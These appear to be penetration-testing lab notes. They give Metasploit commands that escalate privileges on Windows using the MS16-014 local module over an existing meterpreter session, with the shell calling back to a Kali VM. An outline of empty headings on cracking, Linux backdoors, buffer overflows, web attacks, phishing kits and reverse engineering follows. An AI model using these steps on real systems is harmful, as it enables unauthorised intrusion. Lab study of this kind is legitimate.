1. In Metasploit (msf > prompt) type: 
```  
run post/multi/recon/local_exploit_suggester
```
2. Identify exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation

3. In Metasploit (msf > prompt) type: 
```  
use exploit/windows/local/ms16_014_wmi_recv_notif
```
4. In Metasploit (msf > prompt) 
```  
type: set SESSION [meterpreter SESSION number]
```
5. In Metasploit (msf > prompt) type: 
```  
set LPORT 5555
```
6. In Metasploit (msf > prompt) type: 
```  
run
```
NOTE: The shell might default to your eth0 during this attack.  If so, ensure you type set lhost [Kali VM IP Address] and run again.
  
  
  
# cryptografy and cracking plus Steganography etc

### hash identifying

### hash cracker 

### john the ripper 

### ssh2john

### hashcat

### zip2john

# linux backdoors

### ssh backdoor

### php backdoor 

### cronjob backdoor

### bashrc backdoor 
#### .bashrc Backdoors 

### pam-unix-so backdoor
#### pam_unix.so Backdoors 

# Buffer overflow

### fuzzing script

### payload script 

### mona commands 

# web hacking

### SQL injection

### RFI/LFI 

### sqlmap

# Phishing

### GoPhish

### zphisher

### SocialFish

# Reverse-engineering

### tools

### file

### strings

### radare2

### ghidra

### immunity-debugger

### xxd 

### readelf

### objdump


